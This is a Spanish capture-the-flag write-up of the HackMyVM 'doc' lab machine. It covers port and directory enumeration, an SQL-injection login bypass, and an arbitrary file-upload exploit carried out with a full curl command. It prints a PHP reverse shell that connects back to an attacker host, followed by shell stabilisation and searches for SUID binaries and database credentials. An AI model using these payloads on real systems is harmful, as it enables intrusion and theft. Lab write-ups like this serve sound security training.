---
title: "HackMyVM - doc (write-up)"
platform: "HackMyVM"
date: 2026-02-03
author: "maxibarcia"
tags:
  - Linux
  - Nginx
  - SQL-Injection
  - Authentication-Bypass
  - RCE
  - File-Upload-Bypass
estado: "Completado"
image:
  path: /assets/images/posts/hackmyvm/doc/banner.png
toc: true
toc_label: Contenido del Reporte
toc_sticky: true
---
## 1. Reconocimiento de NMAP

Se inicia la fase de enumeración mediante un escaneo de puertos y servicios para identificar vectores de entrada.

```Bash
└─$ sudo nmap -sCV --open 10.0.2.5 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-02 20:16 +0100
Nmap scan report for doc.hmv (10.0.2.5)
Host is up (0.00081s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Online Traffic Offense Management System - PHP
MAC Address: 08:00:27:E6:E5:BD (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```

**Análisis de Resultados:** Al ingresar al servidor web, se detecta un panel de gestión que redirige a `http://doc.hmv/admin/login.php`. Se identifica una vulnerabilidad de **Bypass de Autenticación** mediante **SQL Injection** en el formulario de acceso. Se logra el ingreso utilizando el payload: `'or 1=1;-- -`

## 2. Fuzzing de Directorios (FFUF)

Se realiza una enumeración forzada de directorios para mapear la estructura interna del servidor Nginx.

```Bash
└─$ ffuf -u http://doc.hmv/FUZZ -w /usr/share/wordlists/dirb/common.txt -ic -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://doc.hmv/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 200, Size: 225, Words: 18, Lines: 7, Duration: 10ms]                 [Status: 200, Size: 14323, Words: 2373, Lines: 281, Duration: 18ms]
admin                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 16ms]
assets                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 12ms]
build                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 13ms]
classes                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 13ms]
database                [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 11ms]
dist                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 16ms]
inc                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 20ms]
index.php               [Status: 200, Size: 14323, Words: 2373, Lines: 281, Duration: 28ms]
libs                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 16ms]
pages                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 7ms]
plugins                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 14ms]
uploads                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 28ms]
:: Progress: [4614/4614] :: Job [1/1] :: 2531 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

## 3. Explotación (Intrusión)

### Vector de Entrada: Arbitrary File Upload vía CURL

Se identifica una vulnerabilidad crítica de subida de archivos en la funcionalidad de actualización de usuarios.

- **Endpoint vulnerable:** `http://doc.hmv/classes/Users.php?f=save`
    
- **Método:** `POST` con bypass de extensión y manipulación de `Content-Type`.
    
- **Cookie de sesión activa:** `PHPSESSID=mu8o11s1gf0q0dq5sd1ugq2ok1`
    

### Payload (Reverse Shell PHP)

Se prepara el archivo `prueba.php` con el siguiente código para establecer una conexión reversa:
```PHP
<?php
$sock=fsockopen("10.0.2.7",4433);
$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

### Comando de Reproducción (PoC)

Ejecución del ataque utilizando `curl` para interceptar y procesar la subida del archivo malicioso directamente al servidor.
```Bash
└─$ curl -v -X POST \
  -H "Host: doc.hmv" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: http://doc.hmv/admin/?page=user" \
  -H "Cookie: PHPSESSID=mu8o11s1gf0q0dq5sd1ugq2ok1" \
  -F "id=1" \
  -F "firstname=Adminstrator" \
  -F "lastname=Admin" \
  -F "username=adminyo" \
  -F "password=" \
  -F "img=@prueba.php;type=application/x-php" \
  "http://doc.hmv/classes/Users.php?f=save"

Note: Unnecessary use of -X or --request, POST is already inferred.
* Host doc.hmv:80 was resolved.
* IPv4: 10.0.2.5
*   Trying 10.0.2.5:80...
* Established connection to doc.hmv (10.0.2.5 port 80) from 10.0.2.7 port 45210 
> POST /classes/Users.php?f=save HTTP/1.1
> Host: doc.hmv
> Cookie: PHPSESSID=mu8o11s1gf0q0dq5sd1ugq2ok1
> Content-Type: multipart/form-data;
> 
* upload completely sent off: 850 bytes
< HTTP/1.1 200 OK
< Server: nginx/1.18.0
```

## 4. Post-Explotación: Acceso al sistema

El archivo subido es procesado y almacenado en el directorio `/uploads/` con un timestamp prefijado. Se ejecuta la shell visitando la ruta: `http://doc.hmv/uploads/1770113100_prueba.php`


![Acceso al sistema](/assets/images/posts/hackmyvm/doc/1.png)

Se obtiene acceso como el usuario `www-data` en el servidor objetivo.
- **Tratamiento de la TTY:** Para que la shell no se te cierre y puedas usar flechas o `Ctrl+C`:
    ```Bash
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    # Luego: Ctrl+Z
    stty raw -echo; fg
    export TERM=xterm
    ```
    
- **Enumeración del Sistema:** Busca archivos con permisos SUID o configuraciones de Nginx/PHP que puedan contener contraseñas.
    ```Bash
    find / -perm -u=s -type f 2>/dev/null
    ```
    
- **Búsqueda de archivos de configuración:** Ya que el sistema es un CMS, revisa los archivos en `/var/www/html/classes/` o `/var/www/html/initialize.php` para buscar credenciales de la base de datos MySQL.